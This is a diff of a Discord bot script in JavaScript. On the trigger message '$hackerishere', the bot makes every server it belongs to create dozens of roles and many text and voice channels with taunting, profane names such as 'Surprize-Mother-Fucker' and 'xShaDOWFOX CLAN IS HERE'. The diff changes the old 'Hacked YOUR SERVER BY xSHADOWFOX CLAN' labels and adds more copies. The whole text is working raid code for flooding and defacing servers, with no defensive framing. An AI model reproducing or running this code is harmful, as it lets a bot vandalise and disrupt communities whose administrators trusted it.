@@ -98,231 +98,383 @@ LOka.on('message', message => {
      if (message.content === "$hackerishere") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
         permissions :   [1],
         color : " #ff0000"
     })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
+  m.createRole({
+        name : "Surprize-Mother-Fucker",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           
 
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
-        permissions :   [1],
-        color : " #ff0000"
-    })
  
    
 })
@@ -334,90 +486,221 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "$hackerishere") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
+m.createChannel('Surprize-Mother-Fucker', 'text');
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
 
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
 
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
 
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
-m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
-m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
-m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
-m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
-m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+m.createChannel('Surprize-Mother-Fucker', 'text'); 
+
+
 
 
 
@@ -428,83 +711,205 @@ m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
 LOka.on('message', message => {
          if (message.content === "$hackerishere") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
 
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
 
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
 
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
 
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
 
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
